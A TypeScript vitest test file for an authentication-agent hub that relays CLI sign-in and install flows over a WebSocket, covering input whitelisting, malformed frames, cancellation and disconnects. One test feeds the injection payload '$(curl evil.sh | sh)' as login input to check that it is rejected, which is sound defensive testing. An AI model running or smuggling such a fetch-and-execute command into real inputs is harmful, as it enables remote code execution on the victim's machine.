import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { authAgentHub } from '#domain/auth'
import type { AgentOp } from '@yaac/shared/auth-agent-protocol'
import { ServerError } from '@yaac/shared/errors'
import type { ToolLoginView } from '@yaac/shared/types'

/** The hub's one boundary is the WebSocket the auth server holds open, so
 *  every test drives it through a socket that records the ops sent down. */
function fakeSocket(): {
  sent: AgentOp[]
  sock: { send: (d: string) => void; close: (code?: number, reason?: string) => void }
  close: ReturnType<typeof vi.fn>
} {
  const sent: AgentOp[] = []
  const close = vi.fn()
  return {
    sent,
    close,
    sock: {
      send: (d: string) => sent.push(JSON.parse(d) as AgentOp),
      close: (code?: number, reason?: string) => { close(code, reason) },
    },
  }
}

function view(id: string, status: ToolLoginView['status'], extra: Partial<ToolLoginView> = {}): ToolLoginView {
  return { id, tool: 'claude', status, output: '', ...extra }
}

/** A view push as the agent frames it on the wire. */
function push(kind: 'login' | 'install', v: ToolLoginView): string {
  return JSON.stringify({ op: 'view', kind, view: v })
}

/** Matches the hub's own linger window for a settled flow. */
const LINGER_MS = 5 * 60 * 1000

describe('authAgentHub', () => {
  beforeEach(() => {
    authAgentHub.clearForTests()
    // Fake timers so the linger sweep can be advanced into rather than waited
    // out; the hub arms it with setTimeout and nothing else is time-driven.
    vi.useFakeTimers()
  })

  afterEach(() => {
    vi.useRealTimers()
  })

  it('refuses to start a flow until an agent connects', () => {
    expect(authAgentHub.connected()).toBe(false)
    try {
      authAgentHub.startLogin('claude')
      expect.unreachable('started without an agent')
    } catch (err) {
      expect(err).toBeInstanceOf(ServerError)
      expect((err as ServerError).code).toBe('AUTH_AGENT_DISCONNECTED')
      expect((err as ServerError).message).toMatch(/yaac auth (update|server start)/)
    }

    const { sent, sock } = fakeSocket()
    authAgentHub.setSocket(sock)
    expect(authAgentHub.connected()).toBe(true)
    const v = authAgentHub.startLogin('claude')
    expect(v.status).toBe('running')
    expect(sent).toEqual([{ op: 'start', id: v.id, kind: 'login', tool: 'claude' }])
    expect(authAgentHub.getLogin(v.id).status).toBe('running')
  })

  it('relays a login end to end, then forgets it once the linger expires', () => {
    const { sent, sock } = fakeSocket()
    authAgentHub.setSocket(sock)
    const v = authAgentHub.startLogin('claude')

    // Progress pushes land on the polled view.
    authAgentHub.ingest(push('login', view(v.id, 'running', { output: 'open https://…' })))
    expect(authAgentHub.getLogin(v.id).output).toBe('open https://…')

    // Paste input is whitelisted here as well as agent-side.
    expect(() => authAgentHub.sendLoginInput(v.id, '$(curl evil.sh | sh)')).toThrow(ServerError)
    authAgentHub.sendLoginInput(v.id, '  abc#DEF_123-  ')
    expect(sent.at(-1)).toEqual({ op: 'input', id: v.id, text: 'abc#DEF_123-' })

    // A running flow arms no linger, so it stays pollable indefinitely.
    vi.advanceTimersByTime(LINGER_MS * 2)
    expect(authAgentHub.getLogin(v.id).status).toBe('running')

    authAgentHub.ingest(push('login', view(v.id, 'success', { output: 'done' })))
    expect(authAgentHub.getLogin(v.id).status).toBe('success')
    // Settled flows stop accepting input…
    try {
      authAgentHub.sendLoginInput(v.id, 'abc')
      expect.unreachable('accepted input on a terminal flow')
    } catch (err) {
      expect((err as ServerError).code).toBe('CONFLICT')
    }
    // …and are swept once the linger window passes.
    vi.advanceTimersByTime(LINGER_MS + 1)
    expect(() => authAgentHub.getLogin(v.id)).toThrow(/No sign-in session/)
  })

  it('drops frames it cannot parse or did not mint', () => {
    const { sock } = fakeSocket()
    authAgentHub.setSocket(sock)
    const v = authAgentHub.startLogin('claude')

    for (const raw of [
      'not json',
      'null',                                                         // parses, not an object
      '"a string"',                                                   // ditto
      JSON.stringify({ op: 'start', kind: 'login' }),                  // wrong op
      JSON.stringify({ op: 'view', kind: 'nope', view: view(v.id, 'success') }),
      JSON.stringify({ op: 'view', kind: 'login', view: null }),       // no view
      JSON.stringify({ op: 'view', kind: 'login', view: { id: 1 } }),  // id not a string
      push('login', view(v.id, 'weird' as never)),                     // unknown status
      push('login', view('not-minted', 'success')),                    // an id it never issued
      push('install', view(v.id, 'success')),                          // right id, wrong kind
    ]) {
      authAgentHub.ingest(raw)
    }

    expect(authAgentHub.getLogin(v.id).status).toBe('running')
    expect(() => authAgentHub.getLogin('not-minted')).toThrow(/No sign-in session/)
  })

  it('cancels a settled flow, tells the agent, and ignores ids it does not own', () => {
    const { sent, sock } = fakeSocket()
    authAgentHub.setSocket(sock)
    const v = authAgentHub.startLogin('claude')
    // Settle it first so a linger is armed and cancel has a timer to clear.
    authAgentHub.ingest(push('login', view(v.id, 'success')))

    authAgentHub.cancelLogin(v.id)
    expect(sent.at(-1)).toEqual({ op: 'cancel', id: v.id, kind: 'login' })
    expect(() => authAgentHub.getLogin(v.id)).toThrow(/No sign-in session/)

    // Unknown ids and cross-kind cancels are no-ops — no op reaches the agent.
    const before = sent.length
    authAgentHub.cancelLogin('ghost')
    authAgentHub.cancelInstall('ghost')
    const other = authAgentHub.startInstall('codex')
    authAgentHub.cancelLogin(other.id)
    expect(authAgentHub.getInstall(other.id).status).toBe('running')
    expect(sent.slice(before)).toEqual([{ op: 'start', id: other.id, kind: 'install', tool: 'codex' }])

    // Cancelling a flow that is still running — the common case, with no
    // linger yet armed — drops it just the same.
    authAgentHub.cancelInstall(other.id)
    expect(sent.at(-1)).toEqual({ op: 'cancel', id: other.id, kind: 'install' })
    expect(() => authAgentHub.getInstall(other.id)).toThrow(/No install session/)
  })

  it('fails only the running flows when the agent disconnects', () => {
    const { sock } = fakeSocket()
    authAgentHub.setSocket(sock)
    const settled = authAgentHub.startLogin('claude')
    const running = authAgentHub.startLogin('codex')
    authAgentHub.ingest(push('login', view(settled.id, 'success')))

    authAgentHub.handleDisconnect(sock)
    expect(authAgentHub.connected()).toBe(false)
    // The agent kills its subprocesses on disconnect, so in-flight flows are
    // reported dead rather than left polling forever.
    const after = authAgentHub.getLogin(running.id)
    expect(after.status).toBe('error')
    expect(after.error).toMatch(/disconnected/)
    // An already-settled flow keeps its result.
    expect(authAgentHub.getLogin(settled.id).status).toBe('success')

    // Cancelling with no agent attached still forgets the flow locally.
    authAgentHub.cancelLogin(running.id)
    expect(() => authAgentHub.getLogin(running.id)).toThrow(/No sign-in session/)
  })

  it('closes a replaced connection, which then cannot disconnect its successor', () => {
    const a = fakeSocket()
    const b = fakeSocket()
    authAgentHub.setSocket(a.sock)
    // A close that throws (the socket is already gone) must not block takeover.
    a.close.mockImplementationOnce(() => { throw new Error('already closed') })
    authAgentHub.setSocket(b.sock)
    expect(a.close).toHaveBeenCalled()

    authAgentHub.handleDisconnect(a.sock)
    expect(authAgentHub.connected()).toBe(true)
  })

  it('runs installs through the same shapes, keyed separately from logins', () => {
    const { sent, sock } = fakeSocket()
    authAgentHub.setSocket(sock)
    const v = authAgentHub.startInstall('codex')
    expect(sent.at(-1)).toEqual({ op: 'start', id: v.id, kind: 'install', tool: 'codex' })

    authAgentHub.ingest(push('install', view(v.id, 'success')))
    expect(authAgentHub.getInstall(v.id).status).toBe('success')
    expect(() => authAgentHub.getLogin(v.id)).toThrow(/No sign-in session/)

    authAgentHub.cancelInstall(v.id)
    expect(sent.at(-1)).toEqual({ op: 'cancel', id: v.id, kind: 'install' })
    expect(() => authAgentHub.getInstall(v.id)).toThrow(/No install session/)
  })
})
